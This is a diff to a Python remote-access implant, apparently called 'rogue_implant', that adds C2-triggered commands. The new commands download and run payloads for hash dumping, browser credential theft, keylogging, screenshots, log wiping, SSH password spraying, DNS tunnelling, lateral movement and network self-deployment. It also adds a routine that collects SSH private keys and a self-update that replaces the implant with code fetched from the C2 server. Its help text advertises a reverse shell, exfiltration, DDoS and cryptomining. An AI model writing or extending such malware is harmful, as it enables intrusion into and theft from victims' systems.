@@ -248,6 +248,322 @@ def handle_trigger(cmd):
             return subprocess.getoutput(f"python3 {path}")
         return "[!] polyloader.py not found"
 
+    # === NEW TRIGGERS FOR ENHANCED PAYLOAD SUITE ===
+    
+    elif cmd == "trigger_sysrecon":
+        """Execute system reconnaissance"""
+        fetch_payload("sysrecon.py")
+        print("[+] Starting system reconnaissance")
+        return run_payload("sysrecon.py")
+
+    elif cmd == "trigger_linpeas":
+        """Execute Linux privilege escalation check"""
+        fetch_payload("linpeas_light.py")
+        print("[+] Starting LinPEAS privilege escalation check")
+        return run_payload("linpeas_light.py")
+
+    elif cmd == "trigger_hashdump":
+        """Dump password hashes"""
+        fetch_payload("hashdump.py")
+        print("[+] Starting password hash extraction")
+        return run_payload("hashdump.py")
+
+    elif cmd == "trigger_browsersteal":
+        """Steal browser credentials and data"""
+        fetch_payload("browserstealer.py")
+        print("[+] Starting browser data extraction")
+        return run_payload("browserstealer.py")
+
+    elif cmd.startswith("trigger_keylogger"):
+        """Start/stop keystroke logging"""
+        parts = cmd.split()
+        if len(parts) > 1 and parts[1] == "stop":
+            print("[+] Stopping keylogger")
+            return subprocess.getoutput("pgrep -f keylogger.py && pkill -f keylogger.py || echo '[-] No keylogger running.'")
+        else:
+            fetch_payload("keylogger.py")
+            print("[+] Starting keystroke logger")
+            # Start in background thread
+            threading.Thread(target=lambda: run_payload("keylogger.py")).start()
+            return "[*] Keylogger started in background"
+
+    elif cmd.startswith("trigger_screenshot"):
+        """Take screenshots"""
+        parts = cmd.split()
+        if len(parts) > 1 and parts[1] == "stop":
+            print("[+] Stopping screenshot capture")
+            return subprocess.getoutput("pgrep -f screenshot.py && pkill -f screenshot.py || echo '[-] No screenshot capture running.'")
+        else:
+            fetch_payload("screenshot.py")
+            print("[+] Starting screenshot capture")
+            # Start in background thread
+            threading.Thread(target=lambda: run_payload("screenshot.py")).start()
+            return "[*] Screenshot capture started in background"
+
+    elif cmd.startswith("trigger_logclean"):
+        """Clean system logs"""
+        parts = cmd.split()
+        if len(parts) > 1:
+            fetch_payload("logcleaner.py")
+            if parts[1] == "all":
+                print("[+] Cleaning all logs")
+                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} --all")
+            else:
+                print(f"[+] Cleaning logs: {parts[1]}")
+                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'logcleaner.py')} {parts[1]}")
+        else:
+            fetch_payload("logcleaner.py")
+            print("[+] Cleaning implant logs")
+            return run_payload("logcleaner.py")
+
+    elif cmd.startswith("trigger_sshspray"):
+        """SSH credential spraying attack"""
+        fetch_payload("sshspray.py")
+        parts = cmd.split()
+        if len(parts) > 1:
+            # Parse arguments: trigger_sshspray <target> <userlist> <passlist>
+            if len(parts) >= 4:
+                target = parts[1]
+                userlist = parts[2]
+                passlist = parts[3]
+                print(f"[+] Starting SSH spray attack on {target}")
+                return subprocess.getoutput(f"python3 {os.path.join(HIDDEN_DIR, 'sshspray.py')} {target} {userlist} {passlist}")
+            else:
+                return "[!] Usage: trigger_sshspray <target> <userlist> <passlist>"
+        else:
+            print("[+] Starting SSH spray with default settings")
+            return run_payload("sshspray.py")
+
+    elif cmd.startswith("trigger_dnstunnel"):
+        """DNS tunneling C2 channel"""
+        parts = cmd.split()
+        if len(parts) > 1 and parts[1] == "stop":
+            print("[+] Stopping DNS tunnel")
+            return subprocess.getoutput("pgrep -f dnstunnel.py && pkill -f dnstunnel.py || echo '[-] No DNS tunnel running.'")
+        else:
+            fetch_payload("dnstunnel.py")
+            print("[+] Starting DNS tunneling")
+            # Start in background thread
+            threading.Thread(target=lambda: run_payload("dnstunnel.py")).start()
+            return "[*] DNS tunnel started in background"
+
+    elif cmd == "trigger_autodeploy":
+        """Auto-deploy to network"""
+        fetch_payload("autodeploy.py")
+        print("[+] Starting auto-deployment to network")
+        # Start in background thread as it will take time
+        threading.Thread(target=lambda: run_payload("autodeploy.py")).start()
+        return "[*] Auto-deployment started in background"
+
+    elif cmd == "trigger_network_scan":
+        """Network scanning and host discovery"""
+        fetch_payload("network_scanner.py")
+        print("[+] Starting network scan")
+        return run_payload("network_scanner.py")
+
+    elif cmd == "trigger_persistence_setup":
+        """Set up additional persistence mechanisms"""
+        fetch_payload("persistence.py")
+        print("[+] Setting up additional persistence")
+        return run_payload("persistence.py")
+
+    elif cmd == "trigger_defense_evasion":
+        """Execute defense evasion techniques"""
+        fetch_payload("defense_evasion.py")
+        print("[+] Starting defense evasion")
+        return run_payload("defense_evasion.py")
+
+    elif cmd == "trigger_lateral_move":
+        """Attempt lateral movement"""
+        fetch_payload("lateral_movement.py")
+        print("[+] Attempting lateral movement")
+        return run_payload("lateral_movement.py")
+
+    elif cmd == "trigger_forensics_check":
+        """Check for forensic artifacts"""
+        fetch_payload("forensics_check.py")
+        print("[+] Checking for forensic artifacts")
+        return run_payload("forensics_check.py")
+
+    # === COMPOUND TRIGGERS ===
+    
+    elif cmd == "trigger_full_recon":
+        """Execute full reconnaissance suite"""
+        print("[+] Starting full reconnaissance suite")
+        results = []
+        results.append("=== FULL RECONNAISSANCE SUITE ===")
+        
+        # System reconnaissance
+        fetch_payload("sysrecon.py")
+        results.append("\n[1] System Reconnaissance:")
+        results.append(run_payload("sysrecon.py"))
+        
+        # Privilege escalation check
+        fetch_payload("linpeas_light.py")
+        results.append("\n[2] Privilege Escalation Check:")
+        results.append(run_payload("linpeas_light.py"))
+        
+        # Hash dump
+        fetch_payload("hashdump.py")
+        results.append("\n[3] Password Hash Extraction:")
+        results.append(run_payload("hashdump.py"))
+        
+        # Network scan
+        fetch_payload("network_scanner.py")
+        results.append("\n[4] Network Scan:")
+        results.append(run_payload("network_scanner.py"))
+        
+        return "\n".join(results)
+
+    elif cmd == "trigger_clean_sweep":
+        """Clean all forensic traces and restart stealthily"""
+        print("[+] Starting clean sweep operation")
+        results = []
+        
+        # Clean logs first
+        fetch_payload("logcleaner.py")
+        results.append("[1] Cleaning logs:")
+        results.append(run_payload("logcleaner.py"))
+        
+        # Defense evasion
+        fetch_payload("defense_evasion.py")
+        results.append("\n[2] Defense evasion:")
+        results.append(run_payload("defense_evasion.py"))
+        
+        # Kill and restart implant
+        results.append("\n[3] Restarting implant in stealth mode...")
+        # This would restart the implant - implementation depends on your restart mechanism
+        results.append("[+] Implant will restart after cleanup")
+        
+        return "\n".join(results)
+
+    elif cmd == "trigger_harvest_all":
+        """Harvest all possible data"""
+        print("[+] Starting complete data harvesting")
+        results = []
+        results.append("=== COMPLETE DATA HARVEST ===")
+        
+        # Browser data
+        fetch_payload("browserstealer.py")
+        results.append("\n[1] Browser Data:")
+        results.append(run_payload("browserstealer.py"))
+        
+        # Password hashes
+        fetch_payload("hashdump.py")
+        results.append("\n[2] Password Hashes:")
+        results.append(run_payload("hashdump.py"))
+        
+        # SSH keys
+        results.append("\n[3] SSH Keys:")
+        ssh_keys = subprocess.getoutput("find /home /root -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' -o -name 'authorized_keys' 2>/dev/null")
+        results.append(ssh_keys[:2000])  # Limit output
+        
+        # Configuration files
+        results.append("\n[4] Configuration Files:")
+        config_files = subprocess.getoutput("find /etc -name '*.conf' -o -name '*.cfg' -o -name '*.yml' -o -name '*.yaml' -o -name '*.json' 2>/dev/null | head -20")
+        results.append(config_files)
+        
+        return "\n".join(results)
+
+    # === UTILITY TRIGGERS ===
+    
+    elif cmd == "trigger_status":
+        """Check implant status"""
+        print("[+] Checking implant status")
+        status = []
+        status.append(f"Implant ID: {IMPLANT_ID_HASH}")
+        status.append(f"C2 Server: {C2_HOST}")
+        status.append(f"Hidden Directory: {HIDDEN_DIR}")
+        status.append(f"Process Name: {subprocess.getoutput('ps -p $$ -o comm=')}")
+        status.append(f"Uptime: {subprocess.getoutput('uptime')}")
+        status.append(f"Memory Usage: {subprocess.getoutput('free -h | head -2')}")
+        status.append(f"Network Connections: {len(subprocess.getoutput('netstat -tunap 2>/dev/null | grep ESTABLISHED').splitlines())} established")
+        
+        # Check payloads
+        payloads = os.listdir(HIDDEN_DIR) if os.path.exists(HIDDEN_DIR) else []
+        python_payloads = [p for p in payloads if p.endswith('.py')]
+        status.append(f"Available Payloads: {len(python_payloads)}")
+        
+        return "\n".join(status)
+
+    elif cmd == "trigger_self_update":
+        """Update the implant from C2"""
+        print("[+] Starting self-update")
+        try:
+            # Download latest implant
+            url = f"{PAYLOAD_REPO}rogue_implant.py"
+            req = urllib.request.Request(
+                url,
+                headers={
+                    'User-Agent': f'Rogue-Implant/{IMPLANT_ID_HASH}',
+                    'X-Implant-ID': IMPLANT_ID_HASH
+                }
+            )
+            response = urllib.request.urlopen(req, context=ssl_context, timeout=30)
+            new_implant = response.read()
+            
+            # Save to temporary location
+            temp_file = os.path.join(HIDDEN_DIR, "rogue_implant_new.py")
+            with open(temp_file, 'wb') as f:
+                f.write(new_implant)
+            
+            # Replace current implant
+            current_file = __file__
+            shutil.copy(temp_file, current_file)
+            os.chmod(current_file, 0o755)
+            os.remove(temp_file)
+            
+            return "[+] Implant updated successfully. Restart to apply changes."
+        except Exception as e:
+            return f"[!] Update failed: {e}"
+
+    elif cmd == "trigger_help":
+        """Show available triggers"""
+        help_text = """
+=== ROGUE IMPLANT TRIGGER COMMANDS ===
+
+BASIC OPERATIONS:
+  trigger_status           - Check implant status
+  trigger_self_update      - Update implant from C2
+  trigger_dumpcreds        - Dump credentials from common locations
+  trigger_exfil <path>     - Exfiltrate data from specified path
+  reverse_shell           - Start reverse shell to C2
+
+PAYLOAD EXECUTION:
+  trigger_sysrecon        - System reconnaissance
+  trigger_linpeas         - Linux privilege escalation check
+  trigger_hashdump        - Password hash extraction
+  trigger_browsersteal    - Browser data theft
+  trigger_keylogger       - Start keystroke logging
+  trigger_keylogger stop  - Stop keystroke logging
+  trigger_screenshot      - Start screen capture
+  trigger_screenshot stop - Stop screen capture
+  trigger_logclean        - Clean system logs
+  trigger_logclean all    - Clean all logs aggressively
+  trigger_sshspray        - SSH credential spraying
+  trigger_dnstunnel       - DNS tunneling C2
+  trigger_autodeploy      - Auto-deploy to network
+
+COMPOUND OPERATIONS:
+  trigger_full_recon      - Execute full reconnaissance suite
+  trigger_clean_sweep     - Clean forensic traces and restart
+  trigger_harvest_all     - Harvest all possible data
+
+PERSISTENCE & PROPAGATION:
+  trigger_stealthinject   - Execute polyroot persistence
+  trigger_persistence_setup - Set up additional persistence
+  trigger_defense_evasion - Execute defense evasion techniques
+  trigger_lateral_move    - Attempt lateral movement
+
+DDoS & CRYPTOMINING:
+  trigger_ddos <target> <port> <duration> - DDoS attack
+  trigger_mine            - Start cryptominer
+  trigger_stopmine        - Stop cryptominer
+
+Use: load_payload <name.py> to download or run_payload <name.py> to execute
+        """
+        return help_text
+
     return None
 
 def handle_command(cmd):
